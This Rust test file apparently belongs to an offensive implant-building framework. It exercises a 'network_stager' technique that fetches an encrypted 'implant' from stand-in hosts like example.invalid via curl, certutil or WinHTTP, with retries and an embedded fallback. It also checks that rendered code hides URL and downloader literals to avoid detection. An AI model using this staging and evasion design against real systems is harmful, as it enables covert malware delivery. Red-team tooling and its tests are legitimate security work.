//! Tests for the network-stager control technique.

use super::{
    parse_http_url, scp_port, scp_target, Downloader, HttpUrl, Params, StagerFallback, DEF,
};
use crate::audit::strings::find_sensitive_literals_in_source;
use crate::engine::obfuscation::StringsConfig;
use crate::techniques::{Category, TechniqueKind};

fn strings() -> StringsConfig {
    StringsConfig::from_yaml(None).expect("default strings")
}

/// Minimal params for a URL; `downloader` stays at its default (`auto`).
fn params(url: &str) -> Params {
    Params {
        payload: "implant".to_string(),
        url: url.to_string(),
        ..Default::default()
    }
}

#[test]
fn parses_minimal_params_with_defaults() {
    let step: TechniqueKind = serde_yml::from_str(
        "technique: network_stager\nparams:\n  payload: implant\n  url: \"https://example.invalid/a.bin\"\n",
    )
    .expect("network_stager should parse");
    assert_eq!(
        step,
        TechniqueKind::NetworkStager {
            params: Params {
                payload: "implant".to_string(),
                url: "https://example.invalid/a.bin".to_string(),
                downloader: Downloader::Auto,
                fallback: StagerFallback::None,
                agent: None,
                crypto: super::StagerCrypto::None,
                key: None,
                nonce: None,
                timeout_ms: super::default_timeout_ms(),
                retries: 0,
            }
        }
    );
}

#[test]
fn parses_the_winhttp_transport_the_embedded_fallback_and_the_agent() {
    let step: TechniqueKind = serde_yml::from_str(
        "technique: network_stager\nparams:\n  payload: implant\n  url: \"https://host/a.bin\"\n  downloader: winhttp\n  fallback: embedded\n  agent: \"Mozilla/5.0 (compatible)\"\n",
    )
    .expect("network_stager should parse");
    match step {
        TechniqueKind::NetworkStager { params } => {
            assert_eq!(params.downloader, Downloader::Winhttp);
            assert_eq!(params.fallback, StagerFallback::Embedded);
            assert_eq!(params.agent.as_deref(), Some("Mozilla/5.0 (compatible)"));
        }
        other => panic!("expected network_stager, got {other:?}"),
    }
}

#[test]
fn parses_encrypted_params() {
    let step: TechniqueKind = serde_yml::from_str(
        "technique: network_stager\nparams:\n  payload: implant\n  url: \"https://example.invalid/a.bin\"\n  crypto: xchacha20poly1305\n  key: \"aa\"\n  nonce: \"bb\"\n  timeout_ms: 1000\n  retries: 2\n",
    )
    .expect("network_stager should parse");
    match step {
        TechniqueKind::NetworkStager { params } => {
            assert!(params.crypto.is_encrypted());
            assert_eq!(params.key.as_deref(), Some("aa"));
            assert_eq!(params.nonce.as_deref(), Some("bb"));
            assert_eq!(params.timeout_ms, 1000);
            assert_eq!(params.retries, 2);
        }
        other => panic!("expected network_stager, got {other:?}"),
    }
}

#[test]
fn parses_the_downloader() {
    let step: TechniqueKind = serde_yml::from_str(
        "technique: network_stager\nparams:\n  payload: implant\n  url: \"http://host/a.bin\"\n  downloader: certutil\n",
    )
    .expect("network_stager should parse");
    match step {
        TechniqueKind::NetworkStager { params } => {
            assert_eq!(params.downloader, Downloader::Certutil);
        }
        other => panic!("expected network_stager, got {other:?}"),
    }
    // Absent, the downloader defaults to `auto`.
    let default: TechniqueKind = serde_yml::from_str(
        "technique: network_stager\nparams:\n  payload: implant\n  url: \"http://host/a.bin\"\n",
    )
    .expect("network_stager should parse");
    match default {
        TechniqueKind::NetworkStager { params } => {
            assert_eq!(params.downloader, Downloader::Auto);
        }
        other => panic!("expected network_stager, got {other:?}"),
    }
}

#[test]
fn def_is_well_formed() {
    assert_eq!(DEF.name, "network_stager");
    assert_eq!(DEF.category, Category::Control);
    assert_eq!(DEF.attck, &["T1105", "T1071"]);
    assert!(DEF.conflicts.is_empty());
    assert!(DEF.syscalls.is_empty());
    assert!(!DEF.stub_fragment.is_empty());
    assert!(!DEF.readme.is_empty());
}

#[test]
fn fragment_sources_have_no_forbidden_patterns() {
    let sources = [
        ("stub_fragment.rs", DEF.stub_fragment),
        ("transport_subprocess.rs", super::TRANSPORT_SUBPROCESS),
        ("transport_winhttp.rs", super::TRANSPORT_WINHTTP),
    ];
    for (name, source) in sources {
        for forbidden in [
            "println!",
            "eprintln!",
            "unwrap(",
            "expect(",
            "todo!",
            "unimplemented!",
            "panic!",
            "anyhow",
        ] {
            assert!(
                !source.contains(forbidden),
                "{name} must not contain '{forbidden}'"
            );
        }
    }
}

#[test]
fn renders_the_child_process_transport() {
    let fragment = Params {
        payload: "implant".to_string(),
        url: "https://example.invalid/implant.bin".to_string(),
        // Explicit `curl`: the child-process path for an http(s) URL, which
        // `auto` would route to the in-process transport.
        downloader: Downloader::Curl,
        fallback: StagerFallback::None,
        crypto: super::StagerCrypto::XChaCha20Poly1305,
        key: Some("aa".to_string()),
        nonce: Some("bb".to_string()),
        timeout_ms: 30_000,
        retries: 1,
        ..Default::default()
    }
    .render_fragment(&strings());

    assert!(fragment.contains("fn run_exec"), "run_exec missing");
    assert!(
        fragment.contains("std::process"),
        "the downloader is missing"
    );
    assert!(
        !fragment.contains('$'),
        "unsubstituted placeholder: {fragment}"
    );
    // The URL, the downloader name and the in-process transport's code must not
    // be present.
    assert!(
        !fragment.contains("\"example.invalid\""),
        "url literal leaked: {fragment}"
    );
    assert!(
        !fragment.contains("\"certutil\""),
        "download tool literal leaked: {fragment}"
    );
    assert!(
        !fragment.contains("load_winhttp"),
        "the child-process transport pulled in the WinHTTP code: {fragment}"
    );
    assert!(find_sensitive_literals_in_source(&fragment).is_empty());
}

#[test]
fn renders_the_in_process_transport() {
    // `auto` + https is the in-process transport; the port, path and query come
    // from the build-time URL parse.
    let fragment =
        params("https://example.invalid:8443/implant.bin?token=1").render_fragment(&strings());

    assert!(fragment.contains("fn run_exec"), "run_exec missing");
    assert!(
        fragment.contains("load_winhttp"),
        "the WinHTTP code is missing"
    );
    assert!(
        !fragment.contains("std::process"),
        "an in-process fetch must not spawn a child process: {fragment}"
    );
    assert!(
        !fragment.contains('$'),
        "unsubstituted placeholder: {fragment}"
    );
    assert!(
        !fragment.contains("example.invalid"),
        "host literal leaked: {fragment}"
    );
    assert!(
        !fragment.contains("token=1"),
        "path literal leaked: {fragment}"
    );
    assert!(find_sensitive_literals_in_source(&fragment).is_empty());
}

#[test]
fn both_transports_share_a_64_mib_staged_body_cap() {
    // The cap lives in the shared fragment, so both transports render it.
    assert!(
        DEF.stub_fragment
            .contains("const MAX_STAGED_BYTES: usize = 64 * 1024 * 1024;"),
        "the shared cap must be 64 MiB"
    );

    let child = Params {
        downloader: Downloader::Curl,
        ..params("https://example.invalid/implant.bin")
    }
    .render_fragment(&strings());
    let in_process = params("https://example.invalid/implant.bin").render_fragment(&strings());
    for (name, fragment) in [("child-process", &child), ("in-process", &in_process)] {
        assert!(
            fragment.contains("const MAX_STAGED_BYTES: usize = 64 * 1024 * 1024;"),
            "{name}: the cap is missing: {fragment}"
        );
    }
}

#[test]
fn the_child_process_transport_cleans_up_and_bounds_the_read() {
    let fragment = Params {
        downloader: Downloader::Curl,
        ..params("https://example.invalid/implant.bin")
    }
    .render_fragment(&strings());

    // The guard exists before the downloader runs, so no error below it can
    // leave the temp file on disk.
    let guard = fragment
        .find("let _cleanup = TempFile(out.clone());")
        .expect("the temp-file guard is missing");
    let download = fragment
        .find("run_cmd(&bin, &args")
        .expect("the downloader call is missing");
    assert!(guard < download, "the guard must precede the download");
    assert!(fragment.contains("impl Drop for TempFile"));
    assert!(fragment.contains("std::fs::remove_file(&self.0)"));

    // A timed-out downloader is reaped before the guard tries to delete the
    // partial file it may still hold open; the `try_wait` error path does the
    // same because the child's state is unknown there.
    let kill = fragment
        .find("child.kill()")
        .expect("the timeout kill is missing");
    let wait = fragment
        .find("child.wait()")
        .expect("the timeout reap is missing");
    assert!(kill < wait, "the downloader must be reaped after the kill");
    assert_eq!(
        fragment.matches("child.kill()").count(),
        2,
        "both the timeout and the try_wait error path must kill the child"
    );
    assert_eq!(
        fragment.matches("child.wait()").count(),
        2,
        "both the timeout and the try_wait error path must reap the child"
    );

    // The metadata check rejects an oversized file before reading it, and the
    // bounded read catches metadata that lied or a file that grew.
    assert!(fragment.contains("if meta.len() > MAX_STAGED_BYTES as u64"));
    assert!(fragment.contains("take(MAX_STAGED_BYTES as u64 + 1)"));
    let read = fragment
        .find(".read_to_end(&mut bytes)")
        .expect("the bounded read is missing");
    let read_cap = fragment
        .find("if bytes.len() > MAX_STAGED_BYTES")
        .expect("the read-time cap is missing");
    assert!(read < read_cap, "the read must be checked after it runs");
}

#[test]
fn the_in_process_transport_rejects_an_oversized_body_while_reading() {
    let fragment = params("https://example.invalid/implant.bin").render_fragment(&strings());

    // The chunk `WinHttpQueryDataAvailable` reports is checked against the
    // remaining budget before anything is allocated for it.
    let budget = fragment
        .find("let remaining = MAX_STAGED_BYTES.saturating_sub(bytes.len());")
        .expect("the remaining budget is missing");
    let reject = fragment
        .find("if available as usize > remaining")
        .expect("the oversized-chunk rejection is missing");
    let allocation = fragment
        .find("let mut chunk = vec![0u8; chunk_len];")
        .expect("the capped allocation is missing");
    assert!(
        budget < reject && reject < allocation,
        "the budget must be checked before the allocation"
    );
    assert!(fragment.contains("let chunk_len = (available as usize).min(remaining);"));
}

#[test]
fn rejects_unknown_params_fields() {
    let step: Result<TechniqueKind, _> = serde_yml::from_str(
        "technique: network_stager\nparams:\n  payload: implant\n  url: \"https://example.invalid/a.bin\"\n  typo: 1\n",
    );
    assert!(step.is_err(), "an unknown params key must be rejected");
}

#[test]
fn the_embedded_fallback_renders_the_fall_through() {
    let mut with_fallback = params("https://example.invalid/a.bin");
    with_fallback.fallback = StagerFallback::Embedded;
    let fragment = with_fallback.render_fragment(&strings());
    assert!(
        fragment.contains("the embedded copy is used"),
        "the fallback arm is missing: {fragment}"
    );
    assert!(
        !fragment.contains('$'),
        "unsubstituted placeholder: {fragment}"
    );

    // Strictly staged (the default) has no fallback arm.
    let fragment = params("https://example.invalid/a.bin").render_fragment(&strings());
    assert!(
        !fragment.contains("the embedded copy is used"),
        "a strictly staged plan must not fall back: {fragment}"
    );
}

/// The brace-balanced block after the first `{` that follows `marker`, so the
/// assertions below can look at one generated function instead of the whole
/// fragment.
fn block_after<'a>(source: &'a str, marker: &str) -> Option<&'a str> {
    let marker_at = source.find(marker)?;
    let open = marker_at + source.get(marker_at..)?.find('{')?;
    let rest = source.get(open..)?;
    let mut depth = 0usize;
    for (offset, ch) in rest.char_indices() {
        match ch {
            '{' => depth += 1,
            '}' => {
                depth = depth.saturating_sub(1);
                if depth == 0 {
                    return source.get(open..=open + offset);
                }
            }
            _ => {}
        }
    }
    None
}

#[test]
fn a_successful_retry_reaches_decryption_and_storage() {
    for fallback in [StagerFallback::None, StagerFallback::Embedded] {
        let mut stager = params("https://example.invalid/implant.bin");
        stager.fallback = fallback;
        stager.retries = 2;
        stager.crypto = super::StagerCrypto::XChaCha20Poly1305;
        stager.key = Some("aa".to_string());
        stager.nonce = Some("bb".to_string());
        let fragment = stager.render_fragment(&strings());

        // The bytes and the last error live in separate slots, and the loop
        // breaks on a success before any error can be recorded for it.
        assert!(fragment.contains("let mut fetched: Option<Vec<u8>> = None;"));
        assert!(fragment.contains("let mut last_error: Option<String> = None;"));
        assert!(
            !fragment.contains("failure = Some"),
            "an attempt's failure must not overwrite an earlier success: {fragment}"
        );
        let attempts = block_after(&fragment, "for _ in 0..=").expect("the retry loop is missing");
        let success = attempts
            .find("fetched = Some(bytes);")
            .expect("the success arm is missing");
        let failure = attempts
            .find("last_error = Some(e);")
            .expect("the failure arm is missing");
        assert!(
            success < failure,
            "the success arm must come first in the loop: {attempts}"
        );

        // The outcome is decided on the bytes: the last error is consulted only
        // in the `None` arm, so a success can never fall into it.
        let decision =
            block_after(&fragment, "fn staged_fetch").expect("the outcome helper is missing");
        let fetched = decision
            .find("Some(bytes) => Ok(bytes)")
            .expect("the success outcome is missing");
        let exhausted = decision
            .find("None => match last_error")
            .expect("the exhausted outcome is missing");
        assert!(
            fetched < exhausted,
            "the fetch result must win before the last error: {decision}"
        );

        // A success therefore always runs on to decryption and storage, while
        // the failure branch sits behind the `Err` arm of the outcome.
        let run = block_after(&fragment, "fn run_exec").expect("run_exec is missing");
        let outcome = run
            .find("match staged_fetch(fetched, last_error)")
            .expect("the outcome match is missing");
        let decrypt = run.find("decrypt_staged").expect("decryption missing");
        let store = run.find("store_staged_payload").expect("storage missing");
        assert!(
            outcome < decrypt && decrypt < store,
            "a successful fetch must reach decryption and storage: {run}"
        );

        let branch = match fallback {
            StagerFallback::None => "return Err(e);",
            StagerFallback::Embedded => "the embedded copy is used",
        };
        let branch_at = match run.find(branch) {
            Some(at) => at,
            None => panic!("the failure branch is missing: {run}"),
        };
        assert!(
            outcome < branch_at,
            "the failure branch must only follow the outcome: {run}"
        );
    }
}

#[test]
fn scp_url_is_parsed_into_a_target_and_port() {
    assert_eq!(
        scp_target("scp://user@host:2222/path/implant.bin"),
        "user@host:path/implant.bin"
    );
    assert_eq!(scp_port("scp://user@host:2222/path/implant.bin"), "2222");
    assert_eq!(scp_target("scp://host/path"), "host:path");
    assert_eq!(scp_port("scp://host/path"), "");
}

#[test]
fn parses_http_urls_into_host_port_path_and_tls() {
    assert_eq!(
        parse_http_url("https://host/a.bin?x=1").expect("parsed"),
        HttpUrl {
            host: "host".to_string(),
            port: 443,
            path: "/a.bin?x=1".to_string(),
            secure: true,
        }
    );
    assert_eq!(
        parse_http_url("http://host:8080").expect("parsed"),
        HttpUrl {
            host: "host".to_string(),
            port: 8080,
            path: "/".to_string(),
            secure: false,
        }
    );
    // Userinfo is dropped: WinHTTP has nowhere to put it here.
    assert_eq!(
        parse_http_url("https://user:pass@host/x").expect("parsed"),
        HttpUrl {
            host: "host".to_string(),
            port: 443,
            path: "/x".to_string(),
            secure: true,
        }
    );
    // An IPv6 literal keeps its brackets in the URL and loses them here.
    assert_eq!(
        parse_http_url("http://[::1]:81/x").expect("parsed"),
        HttpUrl {
            host: "::1".to_string(),
            port: 81,
            path: "/x".to_string(),
            secure: false,
        }
    );
    // A query without a path still gets a leading slash.
    assert_eq!(
        parse_http_url("https://host?q=1").expect("parsed"),
        HttpUrl {
            host: "host".to_string(),
            port: 443,
            path: "/?q=1".to_string(),
            secure: true,
        }
    );
}

#[test]
fn rejects_http_urls_without_a_host_or_a_valid_port() {
    assert!(parse_http_url("ftp://host/a.bin").is_err());
    assert!(parse_http_url("https://").is_err());
    assert!(parse_http_url("https://host:0/a.bin").is_err());
    assert!(parse_http_url("https://host:port/a.bin").is_err());
    assert!(parse_http_url("https://[::1/a.bin").is_err());
}
